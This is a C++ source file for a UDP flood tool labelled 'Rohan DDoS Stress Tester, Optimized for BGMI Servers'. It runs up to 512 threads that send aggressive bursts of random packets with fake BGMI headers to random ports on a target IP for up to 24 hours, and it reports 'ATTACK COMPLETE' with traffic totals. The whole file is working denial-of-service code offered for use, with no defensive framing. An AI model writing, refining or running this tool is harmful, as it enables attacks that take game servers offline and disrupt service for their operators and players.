#include <iostream>
#include <iomanip>
#include <thread>
#include <vector>
#include <mutex>
#include <chrono>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <string>
#include <cstring>
#include <fcntl.h>
#include <atomic>
#include <signal.h>
#include <random>
#include <netinet/udp.h>

#define MAX_PACKET_SIZE 65507
#define MIN_PACKET_SIZE 1
#define MAX_DURATION 86400 // 24 hours max
#define MAX_THREADS 512 // Cap for stability
#define BURST_SIZE 15 // Aggressive flooding
#define MICRO_DELAY 500 // Microseconds between bursts
#define BGMI_PORT_RANGE_START 10000
#define BGMI_PORT_RANGE_END 20000

std::atomic<long long> totalPacketsSent(0);
long long totalSendFailures = 0;
double totalDataMB = 0.0;
std::mutex statsMutex;
std::atomic<bool> keepSending(true);
int udpSocket = -1;

void signalHandler(int signum) {
    std::cout << "\nInterrupt received, stopping attack...\n";
    keepSending = false;
}

void countdown(int duration) {
    auto start = std::chrono::steady_clock::now();
    for (int i = duration; i > 0 && keepSending; --i) {
        std::cout << "\rTime Left: " << i << " seconds" << std::flush;
        auto now = std::chrono::steady_clock::now();
        auto elapsed = std::chrono::duration_cast<std::chrono::seconds>(now - start).count();
        if (elapsed > 0 && elapsed % 60 == 0) {
            double rate = totalPacketsSent / elapsed;
            std::cerr << "\nRate at " << elapsed << "s: " << rate << " packets/s, Data: " << std::fixed << std::setprecision(2) << totalDataMB << " MB\n";
        }
        std::this_thread::sleep_for(std::chrono::seconds(1));
    }
    std::cout << "\rTime Left: 0 seconds" << std::endl;
    keepSending = false;
}

void packetSender(int threadId, const std::string& targetIp, int durationSeconds, int packetSize, int numThreads) {
    std::random_device rd;
    std::mt19937 gen(rd() + threadId);
    std::uniform_int_distribution<> portDist(BGMI_PORT_RANGE_START, BGMI_PORT_RANGE_END);
    std::uniform_int_distribution<> randNum(0, 999999);

    char* packet = new char[packetSize];

    struct sockaddr_in serverAddr;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_addr.s_addr = inet_addr(targetIp.c_str());

    // Varied headers for BGMI
    std::string fakeHeader = "BGMI" + std::to_string(randNum(gen)) + "|" + std::to_string(threadId % 100) + ":" + std::to_string(randNum(gen) % 1000);
    int headerLen = std::min((int)fakeHeader.length(), packetSize);
    std::memcpy(packet, fakeHeader.c_str(), headerLen);
    for (int i = headerLen; i < packetSize - 1; i++) {
        packet[i] = randNum(gen) % 256;
    }
    packet[packetSize - 1] = '\0';

    long long threadPackets = 0;
    long long threadFailures = 0;
    double threadDataMB = 0.0;
    auto startTime = std::chrono::steady_clock::now();

    while (keepSending.load(std::memory_order_relaxed)) {
        auto now = std::chrono::steady_clock::now();
        auto elapsed = std::chrono::duration_cast<std::chrono::seconds>(now - startTime).count();
        if (elapsed >= durationSeconds) break;

        int targetPort = portDist(gen);
        serverAddr.sin_port = htons(targetPort);

        int successfulSends = 0;
        for (int burst = 0; burst < BURST_SIZE && keepSending.load(std::memory_order_relaxed); burst++) {
            ssize_t bytesSent = sendto(udpSocket, packet, packetSize, 0,
                                     (struct sockaddr*)&serverAddr, sizeof(serverAddr));
            if (bytesSent > 0) {
                threadPackets++;
                threadDataMB += static_cast<double>(bytesSent) / (1024.0 * 1024.0);
                successfulSends++;
            } else {
                threadFailures++;
                if (errno == EAGAIN || errno == EWOULDBLOCK) {
                    std::this_thread::sleep_for(std::chrono::milliseconds(1));
                } else if (errno == ENOBUFS) {
                    std::this_thread::sleep_for(std::chrono::milliseconds(5));
                } else if (errno == EHOSTUNREACH || errno == ENETUNREACH) {
                    std::cerr << "Thread " << threadId << ": Target unreachable at " << elapsed << "s, errno: " << errno << "\n";
                    break;
                } else {
                    std::cerr << "Thread " << threadId << ": Send failed at " << elapsed << "s, errno: " << errno << " (" << strerror(errno) << ")\n";
                    std::this_thread::sleep_for(std::chrono::milliseconds(50));
                }
            }
            std::this_thread::sleep_for(std::chrono::microseconds(MICRO_DELAY));
        }
        totalPacketsSent += successfulSends;
    }

    {
        std::lock_guard<std::mutex> lock(statsMutex);
        totalSendFailures += threadFailures;
        totalDataMB += threadDataMB;
    }

    delete[] packet;
}

int main(int argc, char* argv[]) {
    signal(SIGINT, signalHandler);
    signal(SIGTERM, signalHandler);

    std::cout << "=======================================\n";
    std::cout << "  Rohan DDoS Stress Tester\n";
    std::cout << "  Optimized for BGMI Servers\n";
    std::cout << "=======================================\n\n";

    if (argc != 6) {
        std::cerr << "Usage: " << argv[0] << " <ip> <port> <time> <threads> <packet_size>\n";
        return 1;
    }

    std::string targetIp = argv[1];
    int targetPort, durationSeconds, numThreads, packetSize;

    try {
        targetPort = std::stoi(argv[2]);
        durationSeconds = std::stoi(argv[3]);
        numThreads = std::stoi(argv[4]);
        packetSize = std::stoi(argv[5]);
    } catch (const std::exception& e) {
        std::cerr << "Invalid argument format\n";
        return 1;
    }

    if (packetSize > MAX_PACKET_SIZE || packetSize < MIN_PACKET_SIZE) {
        std::cerr << "Packet size must be between " << MIN_PACKET_SIZE << " and " << MAX_PACKET_SIZE << "\n";
        return 1;
    }
    if (numThreads < 1 || numThreads > MAX_THREADS) {
        std::cerr << "Number of threads must be between 1 and " << MAX_THREADS << "\n";
        return 1;
    }
    if (durationSeconds < 1 || durationSeconds > MAX_DURATION) {
        std::cerr << "Duration must be between 1 and " << MAX_DURATION << " seconds\n";
        return 1;
    }

    // Dynamic thread adjustment for device resources
    int maxThreads = std::min(numThreads, static_cast<int>(std::thread::hardware_concurrency() * 2));
    if (maxThreads < numThreads) {
        std::cout << "Adjusted threads from " << numThreads << " to " << maxThreads << " based on hardware\n";
        numThreads = maxThreads;
    }

    udpSocket = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (udpSocket < 0) {
        std::cerr << "Socket creation failed, errno: " << errno << "\n";
        return 1;
    }

    struct sockaddr_in localAddr;
    localAddr.sin_family = AF_INET;
    localAddr.sin_addr.s_addr = INADDR_ANY;
    localAddr.sin_port = 0;
    if (bind(udpSocket, (struct sockaddr*)&localAddr, sizeof(localAddr)) < 0) {
        std::cerr << "Bind failed, errno: " << errno << "\n";
        close(udpSocket);
        return 1;
    }

    int flags = fcntl(udpSocket, F_GETFL, 0);
    fcntl(udpSocket, F_SETFL, flags | O_NONBLOCK);

    // Increase socket buffer size
    int bufsize = 16 * 1024 * 1024; // 16MB
    if (setsockopt(udpSocket, SOL_SOCKET, SO_SNDBUF, &bufsize, sizeof(bufsize)) < 0) {
        std::cerr << "Warning: Failed to set send buffer size, errno: " << errno << "\n";
    }

    std::vector<std::thread> senderThreads;
    for (int i = 0; i < numThreads; ++i) {
        senderThreads.emplace_back(packetSender, i, targetIp, durationSeconds, packetSize, numThreads);
    }

    std::cout << "\nAttack started on " << targetIp << ":" << targetPort << " for " << durationSeconds << "s with " << numThreads << " threads\n";
    auto start = std::chrono::steady_clock::now();
    std::thread countdownThread(countdown, durationSeconds);
    countdownThread.join();

    keepSending = false;
    for (auto& t : senderThreads) {
        if (t.joinable()) t.join();
    }

    if (udpSocket >= 0) {
        close(udpSocket);
        udpSocket = -1;
    }

    auto end = std::chrono::steady_clock::now();
    auto elapsed = std::chrono::duration_cast<std::chrono::seconds>(end - start).count();

    std::cout << "\nATTACK COMPLETE\n";
    std::cout << "Total Packets Sent: " << totalPacketsSent << " packets\n";
    std::cout << "Total Send Failures: " << totalSendFailures << "\n";
    std::cout << "Total Data: " << std::fixed << std::setprecision(2) << totalDataMB << " MB\n";
    double totalRate = totalPacketsSent / (elapsed > 0 ? elapsed : 1);
    std::cout << "Average Rate: " << totalRate << " packets/s\n";
    return 0;
}